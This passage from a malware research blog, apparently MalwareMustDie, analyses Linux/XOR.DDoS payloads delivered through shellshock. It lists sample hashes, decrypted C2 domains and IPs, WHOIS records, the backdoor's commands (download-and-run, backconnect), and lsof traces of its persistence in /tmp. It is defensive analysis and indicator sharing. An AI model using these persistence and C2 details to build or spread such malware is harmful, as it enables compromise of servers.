\u003C\/b\u003Eor \u003Cb\u003Ecurl\u003C\/b\u003E) the \u003Cb\u003Eg.rar\u003C\/b\u003E file, permit executable of that file after downloaded and to execute it. To be noted, in most Linux\/XOR.DDoS shellshock cases the last part was not executed but commented with \u003Cb\u003Esharp \"#\"\u003C\/b\u003E.  \u003Cp\u003E\u003Ch2\u003EThe Linux\/XOR.DDoS payloads\u003C\/h2\u003E \u003Cp\u003EHistorically, MalwareMustDie is the first who detected this ELF threat variant, and we named it as \u003Cb\u003ELinux\/XOR.DDoS\u003C\/b\u003E, the analysis was posted in our blog on \u003Cb\u003ESept 29th 2014\u003C\/b\u003E [\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2014\/09\/mmd-0028-2014-fuzzy-reversing-new-china.html\"\u003Elink\u003C\/a\u003E]. This malware became a big problem in early 2015 that IT media and SANS ISC made coverage of it i.e. [\u003Ca href=\"http:\/\/www.infosecurity-magazine.com\/news\/massive-ddos-bruteforce-targets\/\"\u003E-1-\u003C\/a\u003E] [\u003Ca href=\"http:\/\/www.scmagazine.com\/malware-targets-linux-and-arm-architecture\/article\/391497\/\"\u003E-2-\u003C\/a\u003E] [\u003Ca href=\"http:\/\/www.pcworld.com\/article\/2881152\/ddos-malware-for-linux-systems-comes-with-sophisticated-custombuilt-rootkit.html\"\u003E-3-\u003C\/a\u003E] [\u003Ca href=\"https:\/\/isc.sans.edu\/forums\/diary\/XOR+DDOS+Mitigation+and+Analysis\/19827\/\"\u003E-4-\u003C\/a\u003E]  \u003Cp\u003EThis threat is different to other similar Chinese ELF DDOS'ers for usage of many decoding (it used to be an encoded installation script) and encryption (XOR based) used. So our team like to crack this malware threat as if playing CTF with the malware maker. It's good to use our brain well after our day work (or schools). We open and maintain repository of this malware in kernelmode [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=3509\"\u003Elink\u003C\/a\u003E]. And the recent incident of Linux\/XOR.DDoS can be found in our report--\u003E[\u003Ca href=\"http:\/\/blog.malwaremustdie.org\/2015\/06\/mmd-0033-2015-linuxxorddos-infection_23.html\"\u003Elink\u003C\/a\u003E]. The malware is always connected to a hacking effort and owning the victim's server with a \u003Cb\u003Erootkit\u003C\/b\u003E.  \u003Cp\u003EWe can pick any of the IP listed in the shellshock infection one-liner command shell script snipped above, to download the hidden payloads they're using like I did below brutes: (not all, for the idea only)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-5S-ZJZ9ZsYc\/VaSCUhJ1RfI\/AAAAAAAASfg\/QwOfQvWfHZQ\/s2576-Ic42\/004.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-5S-ZJZ9ZsYc\/VaSCUhJ1RfI\/AAAAAAAASfg\/QwOfQvWfHZQ\/s580-Ic42\/004.png\u003E\u003C\/a\u003E \u003Cp\u003EHere's the collection of the payloads collected, thanks to great team work.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-mxxpqEAz_8k\/VaV3NUZcfgI\/AAAAAAAASgA\/2bcdTO5aVrs\/s1800-Ic42\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-mxxpqEAz_8k\/VaV3NUZcfgI\/AAAAAAAASgA\/2bcdTO5aVrs\/s580-Ic42\/006.png\u003E\u003C\/a\u003E\u003Cbr\u003EWe see there's two kind of sample there, unstripped \u0026 encoded+stripped one. I pick the hash 73fd29f4be88d5844cee0e845dbd3dc5 and 758a6c01402526188f3689bd527edf83 for my check..  \u003Cp\u003EThe sample 73fd29f4be88d5844cee0e845dbd3dc5 is typical known XOR.DDoS ELF x32 variant, compiled by below project set of codes:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-8cLCMOUCeGw\/VaR-2vTUmZI\/AAAAAAAASfI\/Ld40sXU4h4g\/s1418-Ic42\/003.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-8cLCMOUCeGw\/VaR-2vTUmZI\/AAAAAAAASfI\/Ld40sXU4h4g\/s400-Ic42\/003.png\u003E\u003C\/a\u003E\u003Cbr\u003E..and obviously a known pattern, see the decrypting way below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-2kAcVF_YxG8\/VaWT9BWsxhI\/AAAAAAAASgQ\/n2IazVavOpQ\/s1912-Ic42\/007.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-2kAcVF_YxG8\/VaWT9BWsxhI\/AAAAAAAASgQ\/n2IazVavOpQ\/s580-Ic42\/007.png\u003E\u003C\/a\u003E\u003Cbr\u003E..and the values of the overall decryption..\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-DcAM0HZixLA\/VaWp2qL1l-I\/AAAAAAAASgc\/kVwh5Pp88Ck\/s2512-Ic42\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-DcAM0HZixLA\/VaWp2qL1l-I\/AAAAAAAASgc\/kVwh5Pp88Ck\/s580-Ic42\/008.png\u003E\u003C\/a\u003E\u003Cbr\u003EA good decrypting can show you straight to the domain used by XOR.DDoS as CNC, in this case is:\u003Cbr\u003E\u003Cfont color=yellow\u003E\u003Cb\u003Ewww1.gggatat456.com in 103.240.141.54\u003C\/b\u003E\u003C\/font\u003E\u003Cbr\u003Eregistered in ENOM under privacy protected contact ID. \u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-mY0h9cKi3eA\/VaWvO9LCTFI\/AAAAAAAASgs\/0EzfJosBI94\/s2580-Ic42\/009.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-mY0h9cKi3eA\/VaWvO9LCTFI\/AAAAAAAASgs\/0EzfJosBI94\/s580-Ic42\/009.png\u003E\u003C\/a\u003E\u003Cpre class=\"brush: asm\"\u003E   Domain Name: GGGATAT456.COM\u003Cbr \/\u003E   Registrar: ENOM, INC.\u003Cbr \/\u003E   Registry Domain ID: 1915186707_DOMAIN_COM-VRSN\u003Cbr \/\u003E   Sponsoring Registrar IANA ID: 48\u003Cbr \/\u003E   Whois Server: whois.enom.com\u003Cbr \/\u003E   Referral URL: http:\/\/www.enom.com\u003Cbr \/\u003E   Name Server: DNS1.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS2.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS3.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS4.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS5.NAME-SERVICES.COM\u003Cbr \/\u003E   Status: clientTransferProhibited http:\/\/www.icann.org\/epp#clientTransferProhibited\u003Cbr \/\u003E   Updated Date: 31-mar-2015\u003Cbr \/\u003E   Creation Date: 31-mar-2015\u003Cbr \/\u003E   Expiration Date: 31-mar-2016\u003Cbr \/\u003E   Last update of whois database: Wed, 15 Jul 2015 00:59:06 GMT\u003Cbr \/\u003E   Tech Email: QJJLPSYSWP@WHOISPRIVACYPROTECT.COM\u003Cbr \/\u003E   Name Server: DNS1.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS2.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS3.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS4.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS5.NAME-SERVICES.COM\u003C\/pre\u003E \u003Cp\u003EDifferent with the previous cases, in the infection analyzed we captured the sample was establishing ssh connection in communicating with CNC and downloading encrypted data by it:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-twU5krZR1co\/VaiKx2l-IaI\/AAAAAAAASlk\/PKWQMFcEBkg\/s2720-Ic42\/041.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-twU5krZR1co\/VaiKx2l-IaI\/AAAAAAAASlk\/PKWQMFcEBkg\/s580-Ic42\/041.png\u003E\u003C\/a\u003E \u003Cp\u003ESince I had many more matters to explain in this post and this malware were analyzed\/discussed many times in kernelmode repositories we opened\/keep on posting, in previous MMD blogs or on other research entity sites too, I will not go too details this binary now but will focus to decode the sources of this infection and infrastructure used by them for the dismantling and stopping purpose.  \u003Cp\u003EThe g.rar with hash 758a6c01402526188f3689bd527edf83 is a bit different. It was ELF-stripped binary (just to make reverse engineering 2% more difficult), and that can be overcame by simple code-mapping:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-6Q4-WAuZDJ0\/VaXDyDegX6I\/AAAAAAAAShE\/CByCUKAvdY0\/s2580-Ic42\/011.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-6Q4-WAuZDJ0\/VaXDyDegX6I\/AAAAAAAAShE\/CByCUKAvdY0\/s580-Ic42\/011.png\u003E\u003C\/a\u003E\u003Cbr\u003E- they included the deflate.c code (obviously ver 1.2.1.2) [\u003Ca href=\"https:\/\/pastebin.com\/mgQ8x66r\"\u003Elink\u003C\/a\u003E] to obfuscate data with zlib compression\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xfjVXZinRhw\/VaXaTnx9J_I\/AAAAAAAAShg\/uUxVjzm4jOI\/s2855-Ic42\/013.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xfjVXZinRhw\/VaXaTnx9J_I\/AAAAAAAAShg\/uUxVjzm4jOI\/s400-Ic42\/013.png\u003E\u003C\/a\u003E\u003Cbr\u003E[Corrected] \u003Ci\u003EI mixed up the above zlib part with crypted part below, thanks VT friend for heads up.\u003C\/i\u003E\u003Cbr\u003EThe below values of XOR encrypted combined with base64 data is also spotted, we did not see it in the others:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-eUIriiVV_jQ\/VaXWHwmklpI\/AAAAAAAAShU\/yIL31H_X1Yw\/s1639-Ic42\/012.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-eUIriiVV_jQ\/VaXWHwmklpI\/AAAAAAAAShU\/yIL31H_X1Yw\/s400-Ic42\/012.png\u003E\u003C\/a\u003E\u003Cbr\u003EThe PoC and the more detail reversing for g.rar is to be added in this part, please take a rain check.  \u003Cp\u003E[Additional] Reversing information below is added via good contribution from Mr.Ivan Korolev (thank you very much for your help!) from his reversing on \u003Cb\u003Eg.rar \/ 7e2280a2dff5028ef2ab37bd420af5d120dfc1d8\u003C\/b\u003E: \u003Ci\u003E\u003Cfont color=yellow\u003E\u003Cbr\u003E1. It's backdoor specific commands list (includes \"download \u0026 run\", \"backconnect\", \"download file to location\", \"set config parameters\", \"connect to specified C\u0026C\" ). And the function that handles C\u0026C communication is located at 0x0804C46E. \u003Cbr\u003E2. Zlib is being used twice: (2.1.) When backdoor collects information about the infected system. Collected information XOR-ed with random 0x20-bytes-long key, encoded with base64 and finally compressed with zlib.  (2.2.)When backdoor downloads compressed file (cmd id == 0x03)\u003C\/font\u003E\u003C\/i\u003E\u003Cbr\u003EThank you Ivan!  [\/Additional]  \u003Cp\u003EA nice tool to deflate compressed zlib data I recommend this nice pipe code [\u003Ca href=\"http:\/\/www.zlib.net\/zpipe.c\"\u003Elink\u003C\/a\u003E].  \u003Cp\u003EAfter you done the rest of (g.rar) binary, the result will show you the CNC hostname of \u003Cfont color=orange\u003E\u003Cb\u003EGroUndHog.MapSnode.CoM in 211.110.1.32\u003C\/b\u003E\u003C\/font\u003E. \u003Cbr\u003EAs a simple PoC for this hostname see the below picture, and I think together with the above mentioned IP list this is also the XOR.DDoS crook's infrastructure:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-_tKVda-9NpI\/VaYGT_UwGAI\/AAAAAAAAShw\/RhDUjoXgEJw\/s2640-Ic42\/014.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-_tKVda-9NpI\/VaYGT_UwGAI\/AAAAAAAAShw\/RhDUjoXgEJw\/s580-Ic42\/014.png\u003E\u003C\/a\u003E\u003Cbr\u003EWell, this domain also registered in ENOM by the same pattern: \u003Cpre class=\"brush: asm\"\u003E   Domain Name: MAPSNODE.COM\u003Cbr \/\u003E   Registrar: ENOM, INC.\u003Cbr \/\u003E   Sponsoring Registrar IANA ID: 48\u003Cbr \/\u003E   Whois Server: whois.enom.com\u003Cbr \/\u003E   Referral URL: http:\/\/www.enom.com\u003Cbr \/\u003E   Name Server: DNS1.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS2.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS3.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS4.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS5.NAME-SERVICES.COM\u003Cbr \/\u003E   Status: clientTransferProhibited http:\/\/www.icann.org\/epp#clientTransferProhibited\u003Cbr \/\u003E   Updated Date: 11-may-2015\u003Cbr \/\u003E   Creation Date: 11-may-2015\u003Cbr \/\u003E   Expiration Date: 11-may-2016\u003Cbr \/\u003E   Last update of whois database: Wed, 15 Jul 2015 07:16:23 GMT\u003Cbr \/\u003E   Tech Email: RRRPBHYTFS@WHOISPRIVACYPROTECT.COM\u003Cbr \/\u003E   Name Server: DNS1.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS2.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS3.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS4.NAME-SERVICES.COM\u003Cbr \/\u003E   Name Server: DNS5.NAME-SERVICES.COM \u003C\/pre\u003E \u003Cp\u003EThe g.rar upon executed will do self-copied in reachable **\/**\/[s]bin directories, and if not having permissions for those location it will be resided in \/tmp or \/var\/tmp, under random names and flooding the system with spawn \u0026 re-spawning process to persist his way to keep alive and connect to CNC.  \u003Cp\u003EBelow is a single process of g.rar looks like post-infected state in lsof: \u003Cpre class=\"brush: asm\"\u003ECOMMAND    PID USER   FD   TYPE    DEVICE SIZE\/OFF    NODE NAME\u003Cbr \/\u003EqrD6E16p 12514 test  cwd    DIR       8,6     4096 1048613 \/TESTDIR\u003Cbr \/\u003EqrD6E16p 12514 test  rtd    DIR       8,1     4096       2 \/\u003Cbr \/\u003EqrD6E16p 12514 test  txt    REG       8,1   664896  264910 \/tmp\/qrD6E16p\u003Cbr \/\u003EqrD6E16p 12514 test    0u  IPv4 133785570      0t0     TCP MMD.SCREW.XOR.DDOS:37098-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003C\/pre\u003E \u003Cp\u003EIt does flooded your system non-stoppable: \u003Cpre class=\"brush: asm\"\u003EqrD6E16p  12514              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EqrD6E16p  12514              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EqrD6E16p  12514              test  txt       REG        8,1   664896     264910 \/tmp\/qrD6E16p\u003Cbr \/\u003EqrD6E16p  12514              test    0u     IPv4  133785570      0t0        TCP MMD.SCREW.XOR.DDOS:37098-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003EqrD6E16p  12514 12523        test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EqrD6E16p  12514 12523        test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EqrD6E16p  12514 12523        test  txt       REG        8,1   664896     264910 \/tmp\/qrD6E16p\u003Cbr \/\u003EqrD6E16p  12514 12523        test    0u     IPv4  133785570      0t0        TCP MMD.SCREW.XOR.DDOS:37098-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003EqrD6E16p  12514 12524        test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EqrD6E16p  12514 12524        test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EqrD6E16p  12514 12524        test  txt       REG        8,1   664896     264910 \/tmp\/qrD6E16p\u003Cbr \/\u003EqrD6E16p  12514 12524        test    0u     IPv4  133785570      0t0        TCP MMD.SCREW.XOR.DDOS:37098-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003ERodiXi3   12631              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003ERodiXi3   12631              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003ERodiXi3   12631              test  txt       REG        8,1   664896     268768 \/tmp\/RodiXi3\u003Cbr \/\u003EQPqitjI5x 12633              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EQPqitjI5x 12633              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EQPqitjI5x 12633              test  txt       REG        8,1   664896     268769 \/tmp\/QPqitjI5x6nd\u003Cbr \/\u003EPR2PhLH   12635              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EPR2PhLH   12635              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EPR2PhLH   12635              test  txt       REG        8,1   664896     268770 \/tmp\/PR2PhLH\u003Cbr \/\u003EhKE6wECZG 12637              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EhKE6wECZG 12637              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EhKE6wECZG 12637              test  txt       REG        8,1   664896     268771 \/tmp\/hKE6wECZGs2\u003Cbr \/\u003EWuMKsp3   12831              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EWuMKsp3   12831              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EWuMKsp3   12831              test  txt       REG        8,1   664896     268772 \/tmp\/WuMKsp3\u003Cbr \/\u003EWuMKsp3   12831              test    0u     IPv4  133786107      0t0        TCP MMD.SCREW.XOR.DDOS:37112-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003EWuMKsp3   12831 12844        test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EWuMKsp3   12831 12844        test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EWuMKsp3   12831 12844        test  txt       REG        8,1   664896     268772 \/tmp\/WuMKsp3\u003Cbr \/\u003EWuMKsp3   12831 12844        test    0u     IPv4  133786107      0t0        TCP MMD.SCREW.XOR.DDOS:37112-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003EWuMKsp3   12831 12844        test    1r      REG        8,1   664896     268772 \/tmp\/WuMKsp3\u003Cbr \/\u003EWuMKsp3   12831 12844        test    2w      REG        8,1   622592     268776 \/tmp\/f9Ca6W\u003Cbr \/\u003EWuMKsp3   12831 12845        test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EWuMKsp3   12831 12845        test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EWuMKsp3   12831 12845        test  txt       REG        8,1   664896     268772 \/tmp\/WuMKsp3\u003Cbr \/\u003EWuMKsp3   12831 12845        test    0u     IPv4  133786107      0t0        TCP MMD.SCREW.XOR.DDOS:37112-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003EWuMKsp3   12831 12845        test    1r      REG        8,1   664896     268772 \/tmp\/WuMKsp3\u003Cbr \/\u003EWuMKsp3   12831 12845        test    2w      REG        8,1   622592     268776 \/tmp\/f9Ca6W\u003Cbr \/\u003EnZS4n     12912              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EnZS4n     12912              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EnZS4n     12912              test  txt       REG        8,1   664896     268765 \/tmp\/nZS4n\u003Cbr \/\u003E5nCVmqNjx 12914              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003E5nCVmqNjx 12914              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003E5nCVmqNjx 12914              test  txt       REG        8,1   664896     268766 \/tmp\/5nCVmqNjx\u003Cbr \/\u003ERf8tMCwI  12916              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003ERf8tMCwI  12916              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003ERf8tMCwI  12916              test  txt       REG        8,1   664896     268773 \/tmp\/Rf8tMCwI\u003Cbr \/\u003E8M0LORVgQ 13074              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003E8M0LORVgQ 13074              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003E8M0LORVgQ 13074              test  txt       REG        8,1   664896     268782 \/tmp\/8M0LORVgQVd\u003Cbr \/\u003E8M0LORVgQ 13074              test    0u     IPv4  133786540      0t0        TCP MMD.SCREW.XOR.DDOS:37124-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003E8M0LORVgQ 13074 13091        test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003E8M0LORVgQ 13074 13091        test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003E8M0LORVgQ 13074 13091        test  txt       REG        8,1   664896     268782 \/tmp\/8M0LORVgQVd\u003Cbr \/\u003E8M0LORVgQ 13074 13091        test    0u     IPv4  133786540      0t0        TCP MMD.SCREW.XOR.DDOS:37124-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003E8M0LORVgQ 13074 13092        test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003E8M0LORVgQ 13074 13092        test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003E8M0LORVgQ 13074 13092        test  txt       REG        8,1   664896     268782 \/tmp\/8M0LORVgQVd\u003Cbr \/\u003E8M0LORVgQ 13074 13092        test    0u     IPv4  133786540      0t0        TCP MMD.SCREW.XOR.DDOS:37124-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003EAL2RROHuq 13137              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EAL2RROHuq 13137              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EAL2RROHuq 13137              test  txt       REG        8,1   664896     268780 \/tmp\/AL2RROHuq\u003Cbr \/\u003EovxnJH438 13139              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EovxnJH438 13139              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EovxnJH438 13139              test  txt       REG        8,1   664896     268781 \/tmp\/ovxnJH438UHem\u003Cbr \/\u003EB2xPwN    13141              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EB2xPwN    13141              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EB2xPwN    13141              test  txt       REG        8,1   664896     268783 \/tmp\/B2xPwN\u003Cbr \/\u003EpR9QwfBw  13143              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EpR9QwfBw  13143              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EpR9QwfBw  13143              test  txt       REG        8,1   664896     268784 \/tmp\/pR9QwfBw\u003Cbr \/\u003EauMlF6Xtv 13145              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EauMlF6Xtv 13145              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EauMlF6Xtv 13145              test  txt       REG        8,1   664896     268765 \/tmp\/auMlF6XtvW9Q\u003Cbr \/\u003EiKk6F78   13147              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EiKk6F78   13147              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EiKk6F78   13147              test  txt       REG        8,1   664896     268773 \/tmp\/iKk6F78\u003Cbr \/\u003EOnnSe0Asd 13149              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EOnnSe0Asd 13149              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EOnnSe0Asd 13149              test  txt       REG        8,1   664896     268775 \/tmp\/OnnSe0AsdJW7\u003Cbr \/\u003EJHpy2Tv   13151              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EJHpy2Tv   13151              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EJHpy2Tv   13151              test  txt       REG        8,1   664896     268776 \/tmp\/JHpy2Tv\u003Cbr \/\u003EHl1GIXA1S 13220              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EHl1GIXA1S 13220              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EHl1GIXA1S 13220              test  txt       REG        8,1   664896     268780 \/tmp\/Hl1GIXA1SVEnOY\u003Cbr \/\u003EHl1GIXA1S 13220              test    0u     IPv4  133786857      0t0        TCP MMD.SCREW.XOR.DDOS:37132-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003EHl1GIXA1S 13220 13239        test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EHl1GIXA1S 13220 13239        test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EHl1GIXA1S 13220 13239        test  txt       REG        8,1   664896     268780 \/tmp\/Hl1GIXA1SVEnOY\u003Cbr \/\u003EHl1GIXA1S 13220 13239        test    0u     IPv4  133786857      0t0        TCP MMD.SCREW.XOR.DDOS:37132-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003EHl1GIXA1S 13220 13240        test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EHl1GIXA1S 13220 13240        test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EHl1GIXA1S 13220 13240        test  txt       REG        8,1   664896     268780 \/tmp\/Hl1GIXA1SVEnOY\u003Cbr \/\u003EHl1GIXA1S 13220 13240        test    0u     IPv4  133786857      0t0        TCP MMD.SCREW.XOR.DDOS:37132-\u003E211.110.1.32:ssh (CLOSE_WAIT)\u003Cbr \/\u003EfggF0R    13290              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EfggF0R    13290              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EfggF0R    13290              test  txt       REG        8,1   664896     268765 \/tmp\/fggF0R\u003Cbr \/\u003EKwBN6mHut 13292              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EKwBN6mHut 13292              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EKwBN6mHut 13292              test  txt       REG        8,1   664896     268773 \/tmp\/KwBN6mHutUe\u003Cbr \/\u003EBaLWO7KCY 13294              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EBaLWO7KCY 13294              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EBaLWO7KCY 13294              test  txt       REG        8,1   664896     268776 \/tmp\/BaLWO7KCY\u003Cbr \/\u003EMPNQT08od 13296              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003EMPNQT08od 13296              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003EMPNQT08od 13296              test  txt       REG        8,1   664896     268781 \/tmp\/MPNQT08odg\u003Cbr \/\u003E6IpaJFDff 13315              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003E6IpaJFDff 13315              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003E6IpaJFDff 13315              test  txt       REG        8,1   664896     268783 \/tmp\/6IpaJFDff5ZS\u003Cbr \/\u003E7IkMtxQ0d 13317              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003E7IkMtxQ0d 13317              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003E7IkMtxQ0d 13317              test  txt       REG        8,1   664896     268786 \/tmp\/7IkMtxQ0dJQC9\u003Cbr \/\u003E86cG6TaT  13321              test  cwd       DIR        8,6     4096    1048613 \/TESTDIR\u003Cbr \/\u003E86cG6TaT  13321              test  rtd       DIR        8,1     4096          2 \/\u003Cbr \/\u003E86cG6TaT  13321              test  txt       REG        8,1   664896     268788 \/tmp\/86cG6TaT\u003C\/pre\u003E \u003Cp\u003ETo reverse is a thing, to PoC what you reversed is correct is another thing. I patched my kernel to intercept every malware activities and dropped the method of depending on system calling tracer to have better view and the result is good, it applying the method to g.rar the PoC of the CNC also can be spotted in its callback process: \u003Cpre class=\"brush: asm\"\u003E\/\/ cnc\u003Cbr \/\u003Edomain:\u003Cbr \/\u003EGroUndHog.MapSnode.CoM\u003Cbr \/\u003EIP: 211.110.1.32\u003Cbr \/\u003Esendto(0, \"#o\\1\\0\\0\\1\\0\\0\\0\\0\\0\\0\\tGroUndHog\\10MapSnode\\3CoM\"..., 40, 0, \u003Cbr \/\u003E   {sa_family=AF_INET, \u003Cbr \/\u003E    sin_port=htons(53), \u003Cbr \/\u003E    sin_addr=inet_addr(\"8.8.8.8\")}, 16) = 40\u003Cbr \/\u003E\u003C\/pre\u003E \u003Cp\u003E\u003Ch2\u003ESumming up the malware related IP addresses involved up to this point:\u003C\/h2\u003E \u003Cp\u003EThe IP addresses used in the shellshock and in the CNC was checked under the below details: \u003Cpre class=\"brush: asm\"\u003E{\u003Cbr \/\u003E  \"ip\": \"43.255.188.2\",\u003Cbr \/\u003E  \"country\": \"HK\",\u003Cbr \/\u003E  \"loc\": \"22.2500,114.1667\",\u003Cbr \/\u003E  \"org\": \"AS134176 Heilongjiang Province hongyi xinxi technology limited\"\u003Cbr \/\u003E\u003Cbr \/\u003E  \"ip\": \"103.20.195.254\",\u003Cbr \/\u003E  \"country\": \"HK\",\u003Cbr \/\u003E  \"loc\": \"22.2500,114.1667\",\u003Cbr \/\u003E  \"org\": \"AS3491 Beyond The 